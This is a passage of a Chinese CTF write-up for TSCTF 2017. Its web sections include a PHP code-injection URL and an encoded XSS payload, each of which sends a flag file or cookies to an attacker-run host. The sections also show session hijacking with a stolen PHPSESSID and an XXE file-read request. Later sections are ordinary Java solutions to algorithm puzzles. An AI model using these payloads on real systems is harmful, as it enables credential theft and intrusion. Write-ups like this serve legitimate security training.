<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.105.42.5:44445&#x2F;re.php?shell&#x3D;..&#x2F;flag.phphttp:&#x2F;&#x2F;10.109.33.193&#x2F;index.php?s&#x3D;cdef%5c%27;print%20file_get_contents(substr($shell,11,37).urlencode(file_get_contents(substr($shell,0,11))));&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
<p>在本地http://10.109.33.193搭建一个服务器，来接收php发送的请求。</p>
<p>最后获得的flag如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]!==<span class="string">&quot;127.0.0.1&quot;</span> &amp;&amp; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]!==<span class="string">&quot;::1&quot;</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Yeah, flag is here. But flag is so secret that only local users could access it.&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span> /&gt;</span><br><span class="line">&lt;title&gt;Flag&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;b&gt;Congratulations!&lt;/b&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">You got the flag. Interesting regex, right?.&lt;br&gt;&lt;br&gt;</span><br><span class="line">TSCTF&#123;h4pp9_enj0y_re93x_T0_3x3c__!!!&#125;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<h1 id="websimple-shop1"><a class="markdownIt-Anchor" href="#websimple-shop1"></a> 【WEB】Simple Shop1</h1>
<p>首先查看网站首页，似乎没什么。</p>
<img src="/2017/05/15/tsctf-2017-online-contest-write-up/image024.png" class="" title="网站首页">
<p>注册了一个账号登陆进去看看。</p>
<img src="/2017/05/15/tsctf-2017-online-contest-write-up/image026.png" class="" title="注册账号">
<img src="/2017/05/15/tsctf-2017-online-contest-write-up/image028.png" class="" title="登陆">
<p>发现一个像是购物似的列表。有flag呀，但是买不到，因为没有钱。</p>
<img src="/2017/05/15/tsctf-2017-online-contest-write-up/image030.png" class="" title="购物列表">
<p>查看网页源代码，发现表单里有一个奇怪的字段 <code>sid</code>，推测可能购买的时候会以这个识别购买的用户，但是谁有钱呢？</p>
<img src="/2017/05/15/tsctf-2017-online-contest-write-up/image032.png" class="" title="购物列表">
<p>网站还有一个ChatRoom 功能，查看一下，貌似TOM童鞋非常有钱。。。下面的目标就是获取TOM童鞋的sid。</p>
<img src="/2017/05/15/tsctf-2017-online-contest-write-up/image034.png" class="" title="ChatRoom">
<p>整个网站没有查看用户名的地方，所以考虑使用reset功能，看看能不能reset一下密码</p>
<img src="/2017/05/15/tsctf-2017-online-contest-write-up/image036.png" class="" title="reset密码">
<p>没有成功reset密码，但是请求里返回了一个sid，可能是TOM童鞋的</p>
<img src="/2017/05/15/tsctf-2017-online-contest-write-up/image038.png" class="" title="失败返回">
<p>用这个sid替换一下表单中的sid，成功买到flag</p>
<img src="/2017/05/15/tsctf-2017-online-contest-write-up/image040.png" class="" title="flag入手">
<h1 id="websimple-shop2"><a class="markdownIt-Anchor" href="#websimple-shop2"></a> 【WEB】Simple Shop2</h1>
<p>按照 <strong>Simple Shop1</strong> 的方法进入，购买列表里有个 <strong>talk to manager</strong> ，界面是这个样子。</p>
<img src="/2017/05/15/tsctf-2017-online-contest-write-up/image042.png" class="" title="给管理员留言">
<p>一时也没有什么切入点，就查看了一下源代码。</p>
<img src="/2017/05/15/tsctf-2017-online-contest-write-up/image044.png" class="" title="页面代码">
<p>里面 <code>get_md5.js</code> 代码是</p>
<img src="/2017/05/15/tsctf-2017-online-contest-write-up/image046.png" class="" title="getmd5.js">
<p>根据以往的经验判断，以为是要尽快算出md5的值，才有资格与管理员通信，于是写了个小程序想爆破一下。结果这个思路是错的，这里md5的作用仅仅是浪费时间，起到一个手动验证码的作用。</p>
<p>后来，有个HINT提示，后台管理员会不停查看这些浏览信息，原来是考查xss相关的知识呀。</p>
<p>测试了好多，发现会后台会过滤 <code>script</code> 、 <code>英文句号.</code> 、 <code>斜杠/</code> 等字符，考虑使用img的onerror构造一个。</p>
<p>主要功能是通过一个script标签访问一个内网地址，网址的参数带上cookie，通过get方式将cookie提交到远程服务器。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&lt;script src&#x3D;&#39;http:&#x2F;&#x2F;10.109.33.193&#x2F;index.php?s&#x3D;&quot;+document.cookie+&quot;&#39;&gt;&lt;&#x2F;script&gt;&quot;</span><br></pre></td></tr></table></figure>
<p>将这段代码HTML encode躲避字符检查，与img的onerror结合起来，通过document.write写入dom中。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&#x27;javascript:document[&quot;write&quot;](<span class="symbol">&amp;#x22;</span><span class="symbol">&amp;#x3C;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x20;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x3D;</span><span class="symbol">&amp;#x27;</span><span class="symbol">&amp;#x68;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x3A;</span><span class="symbol">&amp;#x2F;</span><span class="symbol">&amp;#x2F;</span><span class="symbol">&amp;#x31;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x2E;</span><span class="symbol">&amp;#x31;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x39;</span><span class="symbol">&amp;#x2E;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x2E;</span><span class="symbol">&amp;#x31;</span><span class="symbol">&amp;#x39;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x2F;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x6E;</span><span class="symbol">&amp;#x64;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x78;</span><span class="symbol">&amp;#x2E;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x68;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x3F;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x3D;</span><span class="symbol">&amp;#x22;</span><span class="symbol">&amp;#x2B;</span><span class="symbol">&amp;#x64;</span><span class="symbol">&amp;#x6F;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x75;</span><span class="symbol">&amp;#x6D;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x6E;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x2E;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x6F;</span><span class="symbol">&amp;#x6F;</span><span class="symbol">&amp;#x6B;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x2B;</span><span class="symbol">&amp;#x22;</span><span class="symbol">&amp;#x27;</span><span class="symbol">&amp;#x3E;</span><span class="symbol">&amp;#x3C;</span><span class="symbol">&amp;#x2F;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x3E;</span><span class="symbol">&amp;#x22;</span>)&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>将上面的信息作为消息提交，不一会儿就看到返回的消息，里面带有PHPSession内容。<code>PHPSESSID=fhrlr9dltmis8f00fa1taqmfi</code>，用这段cookie替换本地的cookie，成功拿到管理员权限进入后台。</p>
<img src="/2017/05/15/tsctf-2017-online-contest-write-up/image048.png" class="" title="后台页面">
<p>这里还是没有flag，查看网页源代码发现一个注释，<code>/aaasssddd/flag</code> 里面可能存放着flag。</p>
<img src="/2017/05/15/tsctf-2017-online-contest-write-up/image052.png" class="" title="后台页面网页">
<p>不管怎样先写点儿心路历程吧，请求里发送了一些内容。</p>
<img src="/2017/05/15/tsctf-2017-online-contest-write-up/image050.png" class="" title="一个心路历程">
<p>之前发送的请求都是json格式，这个请求居然是xml格式的，稍微学习了一下，<strong>XXE</strong> 攻击中，可以构建实体来获取指定文件的内容，好在这里没有多少阻碍，构造一个请求</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [<span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///aaasssddd/flag&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>title<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">content</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">content</span>&gt;</span><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>用postman发送到后台地址，成功拿到flag文件的内容</p>
<img src="/2017/05/15/tsctf-2017-online-contest-write-up/image054.jpg" class="" title="发送请求">
<p>Simple Shop虽然麻烦点，但是整个思路感觉还是很不错的。解出这两道题，很大程度上弥补了我们队在PWN上的不足。</p>
<h1 id="coding小明的二进制"><a class="markdownIt-Anchor" href="#coding小明的二进制"></a> 【Coding】小明的二进制</h1>
<blockquote>
<p>小明发现，有些整数，它们十进制表示的时候，数的每一位只能是0或者1。例如0，1，110，11001都是这样的数，而2，13，900不是，因为这些数的某些位还包含0、1以外的数。小明将这些各位只为1或者0的数，命名为“小明二进制”。 现每轮给出一个整数n，计算一下最少要用多少个“小明二进制”数相加才能得到n，总共50轮。 如13可以表示为13个1相加，也可以13=10+1+1+1，或者13=11+1+1，所以13最少需要3个“小明二进制”数相加才能得到。</p>
</blockquote>
<p>开始用了个贪心，找出所有的“小明二进制”数，然后挨个最大的一直减，但是这样做不对。因为我们可以使用任意的组合，按位来看，我们可以将每一位的和拆分到不同的数字上，这样其实就变成了按位找最大的数。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sumygg.tsctf2017.xiaoming;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by Sumy on 2017/5/6.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Work</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getXiaomingStep2</span><span class="params">(<span class="keyword">long</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">long</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (num &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">long</span> x = num % <span class="number">10</span>;</span><br><span class="line">            ans = Math.max(ans, x);</span><br><span class="line">            num /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">int</span>) ans;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Work work = <span class="keyword">new</span> Work();</span><br><span class="line">        work.generateXiaomingNum();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Socket socket = <span class="keyword">new</span> Socket(<span class="string">&quot;10.105.42.5&quot;</span>, <span class="number">41111</span>);</span><br><span class="line">            InputStream input = socket.getInputStream();</span><br><span class="line">            OutputStream output = socket.getOutputStream();</span><br><span class="line">            Scanner scanner = <span class="keyword">new</span> Scanner(input);</span><br><span class="line">            PrintWriter printWriter = <span class="keyword">new</span> PrintWriter(output);</span><br><span class="line">            <span class="keyword">while</span> (scanner.hasNext()) &#123;</span><br><span class="line">                String line = scanner.nextLine();</span><br><span class="line">                System.out.println(line);</span><br><span class="line">                <span class="keyword">if</span> (line.startsWith(<span class="string">&quot;-----&quot;</span>)) &#123;</span><br><span class="line">                    System.out.println(scanner.nextLine());</span><br><span class="line">                    line = scanner.nextLine();</span><br><span class="line">                    System.out.println(line);</span><br><span class="line">                    <span class="keyword">long</span> num = Long.parseLong(line);</span><br><span class="line">                    <span class="keyword">int</span> ans = work.getXiaomingStep2(num);</span><br><span class="line">                    System.out.println(scanner.nextLine());</span><br><span class="line">                    System.out.println(<span class="string">&quot;MyAns: &quot;</span> + ans);</span><br><span class="line">                    printWriter.println(ans);</span><br><span class="line">                    printWriter.flush();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            socket.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="coding泽哥的算术"><a class="markdownIt-Anchor" href="#coding泽哥的算术"></a> 【Coding】泽哥的算术</h1>
<blockquote>
<p>泽哥的数学不是很好，有一天老师给泽哥布置了五十道数学题，要求他在10s内给出A的B次幂的后四位，你能算的出来吗？example input : 123 234 output : 6809</p>
</blockquote>
<p>只要求最后4位，所以只拿最后5位运算即可，不用整个进行运算。乘法的时候使用快速幂运算。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sumygg.tsctf2017.zege;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by Sumy on 2017/5/6.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Work</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">work</span><span class="params">(<span class="keyword">long</span> a, <span class="keyword">long</span> b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">long</span> ans = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">long</span> tmp = a;</span><br><span class="line">        <span class="keyword">while</span> (b &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((b &amp; <span class="number">1</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">                ans *= tmp;</span><br><span class="line">                ans %= <span class="number">100000</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            b &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">            tmp *= tmp;</span><br><span class="line">            tmp %= <span class="number">100000</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans % <span class="number">10000</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Work work = <span class="keyword">new</span> Work();</span><br><span class="line">        System.out.println(work.work(<span class="number">123</span>, <span class="number">234</span>));</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Socket socket = <span class="keyword">new</span> Socket(<span class="string">&quot;10.105.42.5&quot;</span>, <span class="number">42222</span>);</span><br><span class="line">            InputStream input = socket.getInputStream();</span><br><span class="line">            OutputStream output = socket.getOutputStream();</span><br><span class="line">            Scanner scanner = <span class="keyword">new</span> Scanner(input);</span><br><span class="line">            PrintWriter printWriter = <span class="keyword">new</span> PrintWriter(output);</span><br><span class="line">            <span class="keyword">while</span> (scanner.hasNext()) &#123;</span><br><span class="line">                String line = scanner.nextLine();</span><br><span class="line">                System.out.println(line);</span><br><span class="line">                <span class="keyword">if</span> (line.startsWith(<span class="string">&quot;-----&quot;</span>)) &#123;</span><br><span class="line">                    System.out.println(scanner.nextLine());</span><br><span class="line">                    line = scanner.nextLine();</span><br><span class="line">                    System.out.println(line);</span><br><span class="line">                    String[] inputnum = line.split(<span class="string">&quot; &quot;</span>);</span><br><span class="line">                    <span class="keyword">long</span> a = Long.parseLong(inputnum[<span class="number">0</span>]);</span><br><span class="line">                    <span class="keyword">long</span> b = Long.parseLong(inputnum[<span class="number">1</span>]);</span><br><span class="line">                    <span class="keyword">long</span> ans = work.work(a, b);</span><br><span class="line">                    System.out.println(scanner.nextLine());</span><br><span class="line">                    System.out.println(a + <span class="string">&quot;^&quot;</span> + b + <span class="string">&quot;--&gt;&quot;</span> + ans);</span><br><span class="line">                    printWriter.println(ans);</span><br><span class="line">                    printWriter.flush();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            socket.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="codinglas-vegas"><a class="markdownIt-Anchor" href="#codinglas-vegas"></a> 【Coding】Las Vegas</h1>
<blockquote>
<p>在Las Vegas，霸哥想跟我们玩个简单的取石子游戏，规则如下：游戏给出数字A B,双方轮流从A个石子中取走石子，每次不能超过B个，谁能取走最后一个石子谁就算赢。双方需要完成50轮游戏。</p>
</blockquote>
<p>博弈问题，给出的数据总是存在先手必胜的策略，每次取走模(B+1)个即可。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sumygg.tsctf2017.las_vegas;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by Sumy on 2017/5/6.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Work</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Work work = <span class="keyword">new</span> Work();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Socket socket = <span class="keyword">new</span> Socket(<span class="string">&quot;10.105.42.5&quot;</span>, <span class="number">43333</span>);</span><br><span class="line">            InputStream input = socket.getInputStream();</span><br><span class="line">            OutputStream output = socket.getOutputStream();</span><br><span class="line">            Scanner scanner = <span class="keyword">new</span> Scanner(input);</span><br><span class="line">            PrintWriter printWriter = <span class="keyword">new</span> PrintWriter(output);</span><br><span class="line">            <span class="keyword">while</span> (scanner.hasNext()) &#123;</span><br><span class="line">                String line = scanner.nextLine();</span><br><span class="line">                System.out.println(line);</span><br><span class="line">                <span class="keyword">if</span> (line.startsWith(<span class="string">&quot;-----&quot;</span>)) &#123;</span><br><span class="line">                    line = scanner.nextLine();</span><br><span class="line">                    System.out.println(line);</span><br><span class="line">                    String[] inputnum = line.split(<span class="string">&quot; &quot;</span>);</span><br><span class="line">                    <span class="keyword">long</span> a = Long.parseLong(inputnum[<span class="number">0</span>]);</span><br><span class="line">                    <span class="keyword">long</span> b = Long.parseLong(inputnum[<span class="number">1</span>]);</span><br><span class="line">                    <span class="keyword">long</span> choice = a % (b + <span class="number">1</span>);</span><br><span class="line">                    System.out.println(<span class="string">&quot;choice=&quot;</span> + choice);</span><br><span class="line">                    System.out.println(scanner.nextLine());</span><br><span class="line"><span class="comment">//                    System.out.println(a + &quot;^&quot; + b + &quot;--&gt;&quot; + ans);</span></span><br><span class="line">                    printWriter.println(choice);</span><br><span class="line">                    printWriter.flush();</span><br><span class="line">                    <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">                        line = scanner.nextLine();</span><br><span class="line">                        System.out.println(line);</span><br><span class="line">                        <span class="keyword">if</span> (line.startsWith(<span class="string">&quot;Okay&quot;</span>) || line.startsWith(<span class="string">&quot;You&quot;</span>)) &#123;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        a = Long.parseLong(line.split(<span class="string">&quot; &quot;</span>)[<span class="number">1</span>]);</span><br><span class="line">                        choice = a % (b + <span class="number">1</span>);</span><br><span class="line">                        System.out.println(scanner.nextLine());</span><br><span class="line">                        System.out.println(<span class="string">&quot;choice=&quot;</span> + choice);</span><br><span class="line">                        printWriter.println(choice);</span><br><span class="line">                        printWriter.flush();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            socket.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="coding修路"><a class="markdownIt-Anchor" href="#coding修路"></a> 【Coding】修路</h1>
<blockquote>
<p>市政府决定在1000个村子(1,2,3,4…1000)间修些路来方便大家出行，市长决定在录用你之前进行一次考察，题目给出800条连通道路信息，再做1000次询问，要求给出村子A与B之间是否连通，是回答&quot;yes&quot;，否回答&quot;no&quot;。</p>
</blockquote>
<p>连通图问题，使用Floyd算法即可。时间复杂的O(n^3)</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sumygg.tsctf2017.fix_road;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span 